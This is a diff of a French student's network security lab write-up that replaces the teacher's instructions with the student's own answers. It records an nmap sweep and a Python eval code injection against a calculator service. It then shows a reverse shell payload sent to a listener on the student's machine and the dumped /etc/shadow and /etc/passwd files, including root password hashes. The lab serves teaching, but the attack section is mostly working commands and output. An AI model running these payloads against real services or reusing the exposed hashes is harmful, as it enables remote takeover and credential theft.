@@ -25,6 +25,8 @@ Elle permet de chercher les connexions réseau actives générées par le script
 🌞 **Scanner le réseau**
 
 ```
+fmaxance@ZeyKiiPC:~$ sudo nmap -n 110.33.64.0/20 -p13337 --open
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-30 10:32 CET
 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
 Nmap scan report for 10.33.66.165
@@ -60,73 +62,99 @@ Nmap done: 4096 IP addresses (843 hosts up) scanned in 295.53 seconds
 
 🦈 **tp5_nmap.pcapng**
 
-- capture Wireshark de votre `nmap`
-- je ne veux voir que les trames envoyées/reçues par `nmap` dans la capture
+[tp5_nmap.pcapng](tp5_nmap.pcapng)
 
 🌞 **Connectez-vous au serveur**
 
-- éditer le code du client pour qu'il se connecte à la bonne IP et au bon port
-- utilisez l'application !
-- vous devez déterminer, si c'est pas déjà fait, à quoi sert l'application
+On change l'ip et le port dans le `client.py`
+L'application fonctionne comme une calculatrice, on peut rentrer des opérations arithmétiques et l'application renvoie le bon résultat.
 
 ## 2. Exploit
 
-➜ **On est face à une application qui, d'une façon ou d'une autre, prend ce que le user saisit, et l'évalue.**
-
-Ca doit lever un giga red flag dans votre esprit de hacker ça. Tu saisis ce que tu veux, et le serveur le lit et l'interprète.
-
 🌞 **Injecter du code serveur**
 
-- démerdez-vous pour arriver à faire exécuter du code arbitraire au serveur
-- tu sais comment te co au serveur, et tu sais que ce que tu lui envoies, il l'évalue
-- vous pouvez normalement avoir une injection de code :
-  - exécuter du code Python
-  - et normalement, exécuter des commandes shell depuis cette injection Python
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 client.py 
+[sudo] password for fmaxance: 
+Veuillez saisir une opération arithmétique : __import__('os').system('ping -c 1 10.33.73.20')
+```
 
 ## 3. Reverse shell
 
-➜ **Injecter du code c'est bien mais...**
-
-- souvent c'est ***chiant*** si on veut vraiment prendre le contrôle du serveur
-- genre ici, à chaque commande, faut lancer une connexion au serveur étou, relou
-- on pourrait lancer un serveur à nous sur la machine, et s'y connecter, mais s'il y a un firewall, c'est niquéd
-- ***reverse shell* à la rescousse** : l'idée c'est de lancer un shell sur le serveur victime
-
-> C'est *comme* une session SSH, mais c'est à la main, et c'est le serveur qui se connecte à toi pour que toi tu aies le shell. Genre c'est l'inverse de d'habitude. D'où le nom : *reverse* shell.
-
-➜ **Pour pop un reverse shell**
-
-- **en premier**
-  - sur une machine que tu contrôles
-  - tu lances un programme en écoute sur un port donné
-  - un ptit `nc -lvp 9999` par exemple
-- **en deuxième**
-  - sur la machine où tu veux un shell, là où t'as de l'injection de code
-  - tu demandes à l'OS d'ouvrir un port, et de se connecter à ton port ouvert sur la machine que tu contrôles
-  - tu lances un shell (`bash` par exemple)
-  - ce `bash` va "s'accrocher" à la session TCP
-- **enfin**
-  - tu retournes sur la machine que tu contrôles
-  - et normalement, dans ta session `nc -lvp 9999`, t'as un shell qui a pop
-
-➜ **Long story short**
-
-- une commande sur une machine que tu contrôles
-- une commande injectée sur le serveur victime
-- t'as un shell sur le serveur victime depuis la machine que tu contrôles
-
-> Quand tu commences à être bon en bash/réseau étou tu peux pondre ça tout seul. Mais sinon, on se contente de copier des commandes trouvées sur internet c'est très bien.
-
 🌞 **Obtenez un reverse shell sur le serveur**
 
-- si t'as injection de code, t'as sûrement possibilité de pop un reverse shell
-- y'a plein d'exemple sur [le très bon hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
+  Dans mon shell j'execute : `sudo nc -lvnp 6969``
+
+  Dans le client.py : 
+  ```
+  fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 client.py 
+  [sudo] password for fmaxance: 
+  Veuillez saisir une opération arithmétique :__import__('os').system('sh -i /dev/tcp/10.33.73.20/6969 0>&1')
+  ```
 
 🌞 **Pwn**
 
-- voler les fichiers `/etc/shadow` et `/etc/passwd`
-- voler le code serveur de l'application
-- déterminer si d'autres services sont disponibles sur la machine
+shadow :
+```
+cat /etc/shadow
+root:$6$Ac2Zned208vSDVSn$wKuS7q/pIYPo90yin8zl6Ocxd/liQd4aCTnzQEwsTQ2feosGAovhMqxFR.oladVr3G8UbXf2/u.OzeDfWM4aq.::0:99999:7:::
+bin:*:19469:0:99999:7:::
+daemon:*:19469:0:99999:7:::
+adm:*:19469:0:99999:7:::
+lp:*:19469:0:99999:7:::
+sync:*:19469:0:99999:7:::
+shutdown:*:19469:0:99999:7:::
+halt:*:19469:0:99999:7:::
+mail:*:19469:0:99999:7:::
+operator:*:19469:0:99999:7:::
+games:*:19469:0:99999:7:::
+ftp:*:19469:0:99999:7:::
+nobody:*:19469:0:99999:7:::
+systemd-coredump:!!:19621::::::
+dbus:!!:19621::::::
+tss:!!:19621::::::
+sssd:!!:19621::::::
+sshd:!!:19621::::::
+systemd-oom:!*:19621::::::
+it4:$6$bV62paDqH/ZQSVFb$jiBgcgpkuzmmoZSvvLPwpd4gjwvnKQEWTE119tMNTnICtMcJ6dyPcDCVaTur8j5UQFuxAAM6eTimGdr97Nagh1::0:99999:7:::
+```
+
+passwd :
+```
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+sssd:x:998:995:User for sssd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+systemd-oom:x:993:993:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+it4:x:1000:1000:it4:/home/it4:/bin/bash
+```
+
+code serveur :
+[serveur](serveur.py)
+
+Les services disponibles sont ssh et le serveur en python :
+```
+ss -tupnl
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                             
+tcp   LISTEN 2      1          10.0.3.15:13337      0.0.0.0:*    users:(("python3.9",pid=2312,fd=4))
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=699,fd=3))      
+tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=699,fd=4))
+```
 
 ## 4. Bonus : DOS
 
